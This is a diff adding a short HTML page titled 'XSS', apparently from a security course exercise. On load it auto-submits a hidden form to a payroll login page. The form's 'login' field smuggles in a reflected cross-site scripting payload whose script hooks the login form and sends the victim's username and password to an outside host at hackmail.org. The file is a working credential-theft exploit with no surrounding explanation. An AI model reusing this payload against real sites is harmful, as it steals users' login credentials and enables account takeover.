@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+   <head>
+	<meta charset="UTF-8" />
+	<title>XSS</title>
+
+
+   </head>
+   <body onload= "document.forms[0].submit()">
+
+	<form  action= "http://payroll.gatech.edu/index.php"  onsubmit= ""  method = "POST">
+	<input type = 'hidden' name = 'login' value = '"/><script>function myFunction(){return $.ajax({type: "GET", url: "http://hackmail.org/sendmail.php?" + "&username=haxor" + "&payload=" + document.getElementsByName("login")[0].value + " " + document.getElementsByName("pw")[0].value + "&random=" + Math.random(), async: false});}; document.forms[0].setAttribute("onsubmit", "return myFunction();");</script> <br class="'   />
+	
+	</form>
+
+
+
+
+
+
+   </body>
+</html>
+ 
